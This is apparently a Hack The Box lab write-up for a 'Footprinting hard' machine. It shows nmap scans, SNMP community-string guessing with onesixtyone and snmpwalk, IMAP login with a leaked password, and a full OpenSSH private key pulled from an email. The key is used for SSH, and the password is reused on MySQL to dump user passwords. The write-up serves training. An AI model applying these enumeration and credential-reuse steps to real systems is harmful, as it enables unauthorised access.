lab Footprinting hard

hackthebox
	IP: 10.129.202.20
Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.


Let start with scan Ip by using namp 

	  nmap -sCV 10.129.202.20 -p- 

result that I found 
    
        PORT    STATE SERVICE  VERSION
         22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 3f4c8f10f1aebecd31247ca14eab846d (RSA)
        |   256 7b30376750b9ad91c08ff702783b7c02 (ECDSA)
        |_  256 889e0e07fecad05c60abcf1099cd6ca7 (ED25519)
        110/tcp open  pop3     Dovecot pop3d
        |_ssl-date: TLS randomness does not represent time
        |_pop3-capabilities: SASL(PLAIN) STLS PIPELINING RESP-CODES UIDL CAPA AUTH-RESP-CODE USER TOP
        | ssl-cert: Subject: commonName=NIXHARD
        | Subject Alternative Name: DNS:NIXHARD
        | Not valid before: 2021-11-10T01:30:25
        |_Not valid after:  2031-11-08T01:30:25
        143/tcp open  imap     Dovecot imapd (Ubuntu)
        | ssl-cert: Subject: commonName=NIXHARD
        | Subject Alternative Name: DNS:NIXHARD
        | Not valid before: 2021-11-10T01:30:25
        |_Not valid after:  2031-11-08T01:30:25
        |_imap-capabilities: AUTH=PLAINA0001 listed more have post-login ENABLE OK ID STARTTLS capabilities LOGIN-REFERRALS IDLE Pre-login SASL-IR LITERAL+ IMAP4rev1
        |_ssl-date: TLS randomness does not represent time
        993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
        |_ssl-date: TLS randomness does not represent time
        |_imap-capabilities: AUTH=PLAINA0001 listed more post-login ENABLE OK ID have capabilities LOGIN-REFERRALS IDLE Pre-login SASL-IR LITERAL+ IMAP4rev1
        | ssl-cert: Subject: commonName=NIXHARD
        | Subject Alternative Name: DNS:NIXHARD
        | Not valid before: 2021-11-10T01:30:25
        |_Not valid after:  2031-11-08T01:30:25
        995/tcp open  ssl/pop3 Dovecot pop3d
        |_ssl-date: TLS randomness does not represent time
        |_pop3-capabilities: USER SASL(PLAIN) TOP CAPA AUTH-RESP-CODE PIPELINING RESP-CODES UIDL
        | ssl-cert: Subject: commonName=NIXHARD
        | Subject Alternative Name: DNS:NIXHARD
        | Not valid before: 2021-11-10T01:30:25
        |_Not valid after:  2031-11-08T01:30:25
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        
 as per the result we can see imap and pop3 ports are open and ssh aswell.
 lets check UDP ports if there are any ports can help ust to found vulnerable 
      
      nmap -sU 10.129.202.20 -p-
        
        Not shown: 998 closed udp ports (port-unreach)
        PORT    STATE         SERVICE
        68/udp  open|filtered dhcpc
        161/udp open          snmp

As we see two ports are poen one is filterd by firewall, let's focuse on snmp port. 
I used defoult script and version flag on nmap to get more information about snmp ports.
        
        PORT    STATE SERVICE VERSION
        161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
        | snmp-info: 
        |   enterprise: net-snmp
        |   engineIDFormat: unknown
        |   engineIDData: 5b99e75a10288b6100000000
        |   snmpEngineBoots: 10
        |_  snmpEngineTime: 26m32s

snmp was created to monitor network devices. For footprinting SNMP, we can use tools like snmpwalk, onesixtyone, and braa. Snmpwalk.

let start with snmpwal to see what is inside.
     
     snmpwalk -v2c -c public 10.129.202.20
      ![Screenshot 2023-05-18 at 13 39 16](https://github.com/darshilthummar/hacethebox/assets/49148722/e3b9888e-57e8-4e59-bb5d-693093905443)

the sting I used pblic community sting but it's not give any result. So, let user onesixtyone to identify the community string 

    onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
    10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

Backup community sting is used in the snmp. lets change it whith public.

    snmpwalk -v2c -c backup 10.129.202.20

In the result we can see that get one user tom and and the sting NMds732Js**** 

![Screenshot 2023-05-18 at 13 46 44](https://github.com/darshilthummar/hacethebox/assets/49148722/cf829903-9185-4048-876f-9831d5c5a5c2)

this sting can be use in imap as it found open in the scan.
 Let's connect to IMAP port by using openssl 
 
      openssl s_client -connect 10.129.202.20:imaps
  
 let's loging with user tom and the credential:
      
      1 login tom NMds732Js***
 
once we log in use the imap command to get information form mail box.
      
       a1 list "" "*"
       ![Screenshot 2023-05-18 at 13 57 45](https://github.com/darshilthummar/hacethebox/assets/49148722/61456351-3c89-4541-981c-fbeeaa4d9f8b)

select INBOX 
      
       1 select INBOX
       ![Screenshot 2023-05-18 at 13 57 28](https://github.com/darshilthummar/hacethebox/assets/49148722/154ee2b0-b50d-4395-bc04-47de6a26eea4)

As we see there is somting in the INBOX. let's fetch the body massage and find out what is inside.

      a1 FETCH 1 body[]
          HELO dev.inlanefreight.htb
          MAIL FROM:<tech@dev.inlanefreight.htb>
          RCPT TO:<bob@inlanefreight.htb>
          DATA
          From: [Admin] <tech@inlanefreight.htb>
          To: <tom@inlanefreight.htb>
          Date: Wed, 10 Nov 2010 14:21:26 +0200
          Subject: KEY

          -----BEGIN OPENSSH PRIVATE KEY-----
          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
          -----END OPENSSH PRIVATE KEY-----
          )

As we can see that tom had conversation wih bob and they share their key.
save the key in machine and use to connect over ssh.

note: before use in ssh chnage permission of the key with 600 

      ssh -i id_rsa tom@10.129.202.20
![Screenshot 2023-05-18 at 14 10 48](https://github.com/darshilthummar/hacethebox/assets/49148722/ac20b6cc-696d-47d2-ab5e-22cb1ef2a4bf)

we are in!!!

let find what we can find in the machine.
    ![Screenshot 2023-05-18 at 14 12 11](https://github.com/darshilthummar/hacethebox/assets/49148722/b6888bdd-553e-489e-88d0-20b813e6ccb9)

list of file is store in the machine, check one by one. I did find somting in .bash_history. 
There is anothre key and some used mysql in the machine which means that MSQL would be the next scop to look.

I went throug another key but it is same as we found on imap server.
so let check for MYSQL: 

      msql -u tom -p 
 
i requre the password to login so i used same password that we found above.

    ![Screenshot 2023-05-18 at 14 17 26](https://github.com/darshilthummar/hacethebox/assets/49148722/540ffa8e-343f-4009-9f9c-ac0e164db17d)

I got access of sql server.
  lets dig in.  
      
        show databses;
   ![Screenshot 2023-05-18 at 14 18 19](https://github.com/darshilthummar/hacethebox/assets/49148722/6b73840b-7963-4ada-b289-85123e77534f)

        use users;
        show tables;
   ![Screenshot 2023-05-18 at 14 19 28](https://github.com/darshilthummar/hacethebox/assets/49148722/abee0a59-8d17-4c87-8889-72a651b2ae64)

        select * from user;
![Screenshot 2023-05-18 at 14 21 37](https://github.com/darshilthummar/hacethebox/assets/49148722/6737de29-2055-4259-bcb4-b24522b8e138)

 i found list of user and ther password. we can check by looking HTB username or we can run sql query to get HTB user;
 
      SELECT * FROM users WHERE username='HTB';
      
![Screenshot 2023-05-18 at 14 23 32](https://github.com/darshilthummar/hacethebox/assets/49148722/73d01c02-e148-44dc-8388-65503187e7af)

 As we got the password of HTB as it ask for.
      
      
 
      
